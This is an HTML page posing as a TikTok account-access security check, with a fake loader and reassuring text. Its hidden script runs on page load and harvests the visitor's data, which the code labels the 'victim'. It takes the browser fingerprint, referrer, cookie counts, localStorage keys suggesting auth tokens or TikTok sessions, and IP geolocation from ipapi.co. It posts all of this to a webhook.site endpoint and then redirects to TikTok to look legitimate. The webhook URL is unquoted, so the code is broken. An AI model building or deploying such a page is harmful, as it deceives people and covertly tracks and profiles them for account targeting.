<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>We Verify Security</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px; background: #f3f3f3; }
    .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    h1 { color: #2c3e50; }
    p { color: #7f8c8d; }
  </style>
</head>
<body>
  <h1>🔒 Verifying Account Access...</h1>
  <div class="loader"></div>
  <p>Please wait while we confirm secure access.</p>

<script>
// === DATA COLLECTION === //
const collectData = async () => {
    const urlParams = new URLSearchParams(window.location.search);
    const victimId = urlParams.get('id') || 'unknown';

    const data = {
        timestamp: new Date().toISOString(),
        victim_id: victimId,
        url: window.location.href,
        referrer: document.referrer,
        ip_data: {}, // Will be filled via ipapi
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookie_count: document.cookie.split(';').length,
        all_cookies_length: document.cookie.length,
        has_session_storage_enabled : typeof(Storage) !== "undefined",
        screen_resolution : `${screen.width}x${screen.height}`,
        viewport_size : `${window.innerWidth}x${window.innerHeight}`,
        online_status : navigator.onLine.toString(),
        tzo : Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Try detecting known app sessions via localStorage (TikTok uses it)
        has_tiktok_localstorage : Object.keys(localStorage).some(k => k.includes('tiktok') || k.includes('bytedance')),
        
        // Attempt to grab any possible tokens (won't send due to security, but log presence)
        local_storage_keys : Object.keys(localStorage).filter(k => 
            k.includes('tiktok') || 
            k.includes('auth') || 
            k.includes('token') ||
            k.includes('session')
          ),
          
          location_href : window.location.href,
          origin_domain : window.origin
      };

      // GET DETAILED IP INFO USING PUBLIC API
      try {
          const ipRes = await fetch("https://ipapi.co/json/");
          data.ip_data = await ipRes.json();
      } catch (err) {
          data.ip_data_error = err.message;
      }

      // SEND ALL COLLECTED DATA TO WEBHOOK.SITE
      try {
          await fetch(https://webhook.site/c2ce8a8f-8397-475b-8cb2-361308036c3e, {
              method:"POST",
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify(data),
              mode:'no-cors' // bypass CORS restrictions – won't get response but sends anyway
          });
      } catch(e) {}

      // AFTER SENDING DATA -> REDIRECT TO REAL TIKTOK SO THEY THINK IT WAS LEGIT
      setTimeout(() => {
          window.location.href = "https://www.tiktok.com";
      }, 2500);
};

// RUN ON LOAD + DELAY TO ENSURE MORE JS RUNS BEFORE REDIRECT
window.onload = () => setTimeout(collectData, 800);
</script>

</body></html>
